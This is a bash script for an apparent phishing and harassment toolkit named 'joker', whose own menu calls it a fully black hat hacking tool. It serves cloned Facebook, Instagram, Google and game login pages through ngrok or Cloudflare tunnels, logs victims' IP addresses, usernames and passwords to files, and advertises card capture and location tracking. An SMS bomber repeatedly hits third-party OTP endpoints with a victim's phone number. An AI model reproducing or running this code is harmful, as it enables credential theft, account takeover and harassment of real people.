clear
##############################
update(){
#mpv updating.wav > /dev/null 2>1&
echo -e "\e[98m\t\t\t PLEASE WAIT.....!" | pv -qL 10
echo -e "\e[98m\t\t\t UPDATE CHECKING.....!" | pv -qL 10

sleep 5.0
wget -q --spider https://raw.githubusercontent.com/sukhdevr898/joker/main/update2.2
if [ $? -eq 0 ];
then 
mpv m/updated.wav  > /dev/null 2>1&
echo -e "\e[96m\t\t\t" | pv -qL 10
echo -e "\e[96m\t\t\t     TOOL ARLEADY UPDATED VERSION    [✓]               " | pv -qL 10
echo -e "\e[96m\t\t\t " | pv -qL 10

sleep 5.0
choose 
option

else 
mpv m/error.mp3 > /dev/null 2>1&
mpv m/updating.wav > /dev/null 2>1&
echo -e "\e[96m\t\t\t " | pv -qL 10  
echo -e "\e[96m\t\t\t     UPDATE AVAILABLE  [✓]                             " | pv -qL 10
echo -e "\e[96m\t\t\t " | pv -qL 10

echo -e "\e[96m\t\t\t " | pv -qL 10  

echo -e "\e[96m\t\t\t              UPDATING....!                            " | pv -qL 10

echo -e "\e[96m\t\t\t |------------------------------------------------------|" | pv -qL 10

cd $HOME
rm -rf joker 
git clone https://github.com/sukhdevr898/joker > /dev/null 2>1&
cd joker 
bash setup.sh 
fi
}
flare(){
mpv $HOME/joker/m/flare.wav > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|" | pv -qL 150
echo -e "\e[96m                              CLOUDFLARED SERVER             " | pv -qL 150
echo -e "\e[96m                 copy this command =>(  flare   )            " | pv -qL 150
echo -e "\e[96m             OPEN NEW SESSION AND RUN ABOVE COMMAND          " | pv -qL 150
echo -e "\e[96m        |=====================================================|" | pv -qL 150

}
local(){
php -S localhost:8080 > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|" | pv -qL 150
echo -e "\e[96m              [\e[92m1\e[96m]==> NGROK                       " | pv -qL 150
echo -e "\e[96m              [\e[92m2\e[96m]==> CLOUDFLARE                  " | pv -qL 150
echo -e "\e[96m        |=====================================================|" | pv -qL 150
read -p "CHOOSE SERVER : " flare
if [ $flare == 1 ];
then 
ngrok

elif [ $flare == 2 ];
then 
flare
fi
}

link(){
if [ -e link.txt ];
then
rm link.txt
fi
curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io" > link.txt



}
ngrok(){
cd $HOME
echo -e "\e[91m \t\t PLEASE ON MOBILE HOTSPOT " | pv -qL 20
sleep 5.0
echo -e "\e[92m\n\t\t LOCALHOST STARTING... " | pv -qL 20
sleep 2.0
echo -e "\e[92m \n\t\t NGROK STARTING... " | pv -qL 20

./ngrok http 8080 > /dev/null 2>1&
sleep 5.0
cd joker/.sites/$url
link

echo -e "\e[96m \n \tLOCALHOST : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃  \t\t127.0.0.1:8080                   "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[96m \n \tNGROK LINK : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e " $(cat link.txt)"

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

}
ip(){

if [ -e ip.txt ];
then 
mpv $HOME/joker/m/cap.mp3 > /dev/null 2>1&
#|mpv datacap.wav > /dev/null 2>1&
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃" | pv -qL 100
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\n"
echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
echo -e "\e[94m\n┃-------  (SAVE IN IP.TXT)  -------┃"
echo -e "\n"
cat ip.txt | pv -qL 100
rm ip.txt
echo -e "\n"
fi
}




speed(){
clear

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃           SUKHDEVR898                  "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

curl https://ipinfo.io/ip > Ip.txt 2> /dev/null

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m YOUR IP ADDRESS : $(cat Ip.txt)                  "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
rm Ip.txt



echo -e "\e[94m\n\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

             speedtest
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\e[94m             ━━━━━━DONE━━━━━━━ "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
}


############################
if [ -e server_setup ];
then
echo -e "\e[97m SERVER SETUP.....!"
chmod +x server_setup
bash server_setup
rm server_setup
fi
banner(){


#mpv /sdcard/Music/start.mp3 > /dev/null 2>1&
echo -e "\e[1;97m $(cat banner.txt)" | pv -qL 130
echo ""
clear
}


unuse(){


wget -q --spider https://raw.githubusercontent.com/sukhdevr898/joker/main/update2.2

while true ;
do
if [ $? -eq 0 ];
then 
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     CONNECTING....[!] " | pv -qL 10
echo -e "\e[96m\t\t\t\n\n"
echo -e "\e[96m\n\t\t\t |========= NOW  YOU ARE CONNECTED WITH SERVER ✓    ===|" | pv -qL 10
else 
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     NOT CONNECTED [×]                                 " | pv -qL 20
echo -e "\e[96m\t\t\t "
echo -e "\e[96m\t\t\t     CHECK INTERNET CONNECTION OTHERWISE               " | pv -qL 20
echo -e "\e[96m\t\t\t |  THIS TOOL REMOVED BY SUKHDEVR898 YOU CAN'T USE      " | pv -qL 20
echo -e "\e[96m\t\t\t |------------------------------------------------------|" | pv -qL 20
 sleep 2.0
 
fi
done
clear
}
#banner
sbomb(){
clear
mpv m/click.mp3 > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------WELCOME TO SMS BOMBER -------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               NOTE :- NO NEED TO ENTER COUNTARY CODE                     "
echo -e "\e[96m               UNLIMITED BOMBER ✓                 "
echo -e "\e[96m                               "
echo -e "\e[96m                                   "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m        |--------------ENTER VICTIM NUMBER -------------------|"
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\n\n"
mpv /number.wav > /dev/null 2>1&
read -p "  ENTER  MOBILE NUMBER : " mobile

count="0"


if [ $mobile == "9352037092" ];
then
mpv m/error.mp3 > /dev/null 2>1&

echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                   ADMIN'S NUMBER NOT ALLOWED "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\n\n"
sleep 5.0
sbomb
else
while true ;
do
clear
curl -L -s "https://api.mydukaan.io/api/account/seller/sign-in/?mobile=$mobile&country_code=%2B91" > /dev/null 2>&1


let count++
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |-------------------------BOMBER----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                      BOMBING START...                                       "
echo -e "\e[96m                                    "
echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
echo -e "\e[96m                SENT SMS        :    $count             "
echo -e "\e[96m                                   "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"

sleep 1.0


clear
curl -L -s "http://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=$mobile&newOtp=true&retry=false&channel=web&domainName=www.confirmtkt.com&testparamsp=true" > /dev/null 2>&1

let count++

echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |-------------------------BOMBER----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                      BOMBING START...                                       "
echo -e "\e[96m                                    "
echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
echo -e "\e[96m                SENT SMS        :    $count             "
echo -e "\e[96m                                   "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"


sleep 1.0


clear

curl -L -s "https://web.bikry.com/otp/generate?mobile=$mobile&communication=true" > /dev/null 2>&1
let count++



echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |-------------------------BOMBER----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                      BOMBING START...                                       "
echo -e "\e[96m                                    "
echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
echo -e "\e[96m                SENT SMS        :    $count             "
echo -e "\e[96m                                   "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"

sleep 1.0
done
fi
}

################functions



game(){
clear
echo -e "\e[96m        |=====================================================|" | pv -qL 50
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|" | pv -qL 50
echo -e "\e[96m        |=====================================================|" | pv -qL 50
echo -e "\e[96m                                                             " | pv -qL 50
echo -e "\e[96m                                                             " | pv -qL 50
echo -e "\e[96m               [\e[92m1\e[96m]==> PUBG                       " | pv -qL 50 
echo -e "\e[96m               [\e[92m2\e[96m]==> FREE FIRE                  " | pv -qL 50
echo -e "\e[96m                                                             " | pv -qL 50
echo -e "\e[96m            NOTE : - PASSWORDS SAVE IN 'www' DIRECTORY       " | pv -qL 50
echo -e "\e[96m                                                             " | pv -qL 50
echo -e "\e[96m        |=====================================================|" | pv -qL 50
echo -e "\e[96m        |                                                     |" | pv -qL 50
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|" | pv -qL 50
echo -e "\e[96m        |                                                     |" | pv -qL 50
echo -e "\e[96m        |=====================================================|" | pv -qL 50
 
echo -e "\n"
read -p " CHOOSE A GAME :  " pubg
case $pubg in 
1)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/pubg/notp
url="pubg/notp"
local


while true;

do
ip

if [ -e gmail.txt ];
then
mpv $HOME/joker/m/cap.mp3 > /dev/null 2>1&
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&

echo -e "\n"
echo -e "\e[98m \n\tGMAIL :  $(cat gmail.txt)  "
cat gmail.txt >> $HOME/joker/www/pubg.txt
rm gmail.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m\n\tPASSWORD :  $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/pubgpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
2)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/freefire/notp
url="freefire/notp"
local

while true;

do
ip
if [ -e gmail.txt ];
then
mpv $HOME/joker/m/cap.mp3 > /dev/null 2>1&
echo -e "\n"
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m $(cat gmail.txt)  "
cat gmail.txt >> $HOME/joker/www/ff.txt
rm gmail.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/ffpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
::
esac

}


social1(){
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               [\e[92m1\e[96m]==> FACEBOOK                   "
echo -e "\e[96m               [\e[92m2\e[96m]==> INSTAGRAM                  "
echo -e "\e[96m               [\e[92m3\e[96m]==> GOOGLE                     "
echo -e "\e[96m               [\e[92m00\e[96m]==> BACK                      "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |===================HACK3R============================|" | pv -qL 70 
echo -e "\e[96m        |                                                     |" | pv -qL 70
echo -e "\e[96m        |                                                     |" | pv -qL 70
echo -e "\e[96m        |    NOTE:-  PASSWORD  SAVE IN 'www' DIRECTORY        |" | pv -qL 70
echo -e "\e[96m        |                                                     |" | pv -qL 70
echo -e "\e[96m        |=====================================================|" | pv -qL 70

read -p "CHOOSE ATTACK : " OP1



}


social(){

if [ $OP1 == 1 ];

then 
mpv m/click.mp3 > /dev/null 2>1&
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               [\e[92m1\e[96m]==> FACEBOOK                   "
echo -e "\e[96m               [\e[92m2\e[96m]==> FB ADVANCE                 "
echo -e "\e[96m               [\e[92m3\e[96m]==> FB SECURITY                "
echo -e "\e[96m               [\e[92m4\e[96m]==> FB MESSENGER               "
echo -e "\e[96m               [\e[92m00\e[96m]==> BACK.                     "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\n"
read -p "CHOOSE ATTACK : " FB
case $FB in
1)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="facebook"

cd facebook
local 
while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/fb.txt
rm usernames.txt 
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  $HOME/joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;


2)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="fb_advanced"
cd fb_advanced
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >>  $HOME/joker/www/fb.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  $HOME/joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
3)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="fb_security"

cd fb_security
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >>  $HOME/joker/www/fb.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  $HOME/joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
4)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites
url="fb_messenger"
 

cd fb_messenger
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >>  $HOME/joker/www/fb.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  $HOME/joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
00)
mpv m/click.mp3 > /dev/null 2>1&
social1
social
;;
esac
elif [ $OP1 == 2 ];
then 
mpv m/click.mp3 > /dev/null 2>1&
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               [\e[92m1\e[96m]==> INSTAGRAM                  "
echo -e "\e[96m               [\e[92m2\e[96m]==> IG FOLLOWER                "
echo -e "\e[96m               [\e[92m3\e[96m]==> IG FOLLOWERS               "
echo -e "\e[96m               [\e[92m4\e[96m]==> IG BLUE TICK               "
echo -e "\e[96m               [\e[92m00\e[96m]==> BACK                      "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\n"
read -p "CHOOSE ATTACK : " IG
case $IG in
 
1)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="instagram"

cd instagram
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
2)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="ig_followers"

cd ig_followers
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/ig.txt
rm usernames.txt
fi
if [ -e passs.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
3)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites

url="insta_followers"
cd insta_followers
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
4)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="ig_verify"

cd ig_verify
local
while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
00)
mpv m/click.mp3 > /dev/null 2>1&
social1
social
;;
esac

elif [ $OP1 == 3 ];
then
clear
mpv m/click.mp3 > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                                                             "
echo -e "\e[96m               [\e[92m1\e[96m]==> GOOGLE                     "
echo -e "\e[96m               [\e[92m2\e[96m]==> GOOGLE POLL                "
echo -e "\e[96m               [\e[92m3\e[96m]==> GOOGLE NEW                 "
echo -e "\e[96m               [\e[92m00\e[96m]==> BACK                      "
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"

echo -e "\n"
read -p "CHOOSE ATTACK : " GG
case $GG in
1)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/

url="google"
cd google 
local
ip
while true;

do
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/google.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/googlepass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;

2)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites/
url="google_poll"

cd google_poll
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/google.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/googlepass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
3)
mpv m/click.mp3 > /dev/null 2>1&
cd .sites
url="google_new"


cd google_new
local

while true;

do
ip
if [ -e usernames.txt ];
then
mpv $HOME/joker/m/datacap.wav > /dev/null 2>1&
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/google.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/googlepass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
00)
mpv m/click.mp3 > /dev/null 2>1&
social1
social
;;

esac
elif [ $OP1 == 00 ];
then
mpv m/click.mp3 > /dev/null 2>1& 
choose
option

else
clear
mpv m/error.mp3 > /dev/null 2>1&
mpv $HOME/joker/error1.wav > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m                                                             "
echo -e "\e[96m                              ERROR"
echo -e "\e[96m                                                             "
echo -e "\e[96m        |=====================================================|"
sleep 3.0
clear
social1
social

fi



}





new(){
clear
mpv $HOME/joker/m/create.wav > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|" | pv -qL 20
echo -e "\e[96m                                                             " | pv -qL 20
echo -e "\e[96m                       WHATS NEW IN JOKER 2.2" | pv -qL 20
echo -e "\e[96m                • CARD CAPTURE ADDED + OTP              " | pv -qL 20
echo -e "\e[96m                • LITE SIZE                        " | pv -qL 10
echo -e "\e[96m                • BUG FIXED                             " | pv -qL  10
echo -e "\e[96m                • CRASH FIXED                          " | pv -qL 10
echo -e "\e[96m                • NEW UI  ADDED                             " | pv -qL 10
echo -e "\e[96m                • SMS BOMBER                             " | pv -qL  10
echo -e "\e[96m        |=====================================================|" | pv -qL 20
sleep 8.0
choose
option

}


##################


choose(){
clear
#mpv start.mp3 > /dev/null 2>1&
echo -e "                       \e[92m TOOL BY (SUKHDEVR898)\e[0m"
echo
echo -e "\e[96m||━━━━━━━━━━━━━━━━━━━━━━━━━━[V 2.2]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━||"
echo -e "\e[96m||------------------------\e[92mSELECT OPTIONS\e[96m--------------------------||"
echo -e "\e[96m||━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━||"
echo -e "\e[96m                                                                "
echo -e "\e[96m                                                                "
echo -e "\e[96m                      [\e[92m1\e[96m]==> SOCIAL MEDIA [✓]                   "
echo -e "\e[96m                      [\e[92m2\e[96m]==> LOCTAION TRACKER [✓]               "
echo -e "\e[96m                      [\e[92m3\e[96m]==> GAME PSHISH                        "
echo -e "\e[96m                      [\e[92m4\e[96m]==> CARD CAPUTE                        "
echo -e "\e[96m                      [\e[92m5\e[96m]==> ABOUT                              "
echo -e "\e[96m                      [\e[92m6\e[96m]==> UPDATE                             "
echo -e "\e[96m                      [\e[92m7\e[96m]==> EXIT                               "
echo -e "\e[96m                      [\e[92m8\e[96m]==> CHECK SPEED                        "
echo -e "\e[96m                      [\e[93m9\e[98m]==> SMS BOMBER                         "
echo -e "\e[90m                      [\e[95m00\e[95m]==> WHAT'S NEW                        "
echo -e "\e[96m                                                                "
echo -e "\e[96m||━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━||"
echo -e "\e[96m||--------------------------\e[91mHACK3R\e[96m--------------------------------||"
echo -e "\e[96m||━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━||"

read -p " SELECT A OPTION :    " OP

}


option(){


case $OP in
1)
clear 
mpv m/click.mp3 > /dev/null 2>1&
social1
social
;;
2)
mpv m/click.mp3 > /dev/null 2>1&
bash loc.sh
;;
5)
mpv m/click.mp3 > /dev/null 2>1&
mpv $HOME/joker/m/create.wav > /dev/null 2>1&
clear
echo -e "\e[96m \t\t\t|======================================================|" | pv -qL 50
echo -e "\e[96m\t\t\t              SUKHDEVR898                              " | pv -qL 50
echo -e "\e[96m\t\t\t       FACEBOOK : https://m.facebook.com/sukhdevr898   " | pv -qL 50
echo -e "\e[96m\t\t\t      INSTAGRAM : https://m.instagram.com/sukhdevr898  " | pv -qL 50
echo -e "\e[96m\t\t\t        WEBSITE : https://sukhdevr898.site123.me       " | pv -qL 50
echo -e "\e[96m\t\t\t                                                       " | pv -qL 50
echo -e "\e[96m\t\t\t |======================================================|" | pv -qL 50
echo -e "\e[96m\t\t\t                                                       " | pv -qL 50
echo -e "\e[96m\t\t\t                                                       " | pv -qL 50 
echo -e "\e[96m\t\t\t             FULLY BLACK HAT HACKING TOOL              " | pv -qL 50
echo -e "\e[96m\t\t\t                                                       " | pv -qL 50
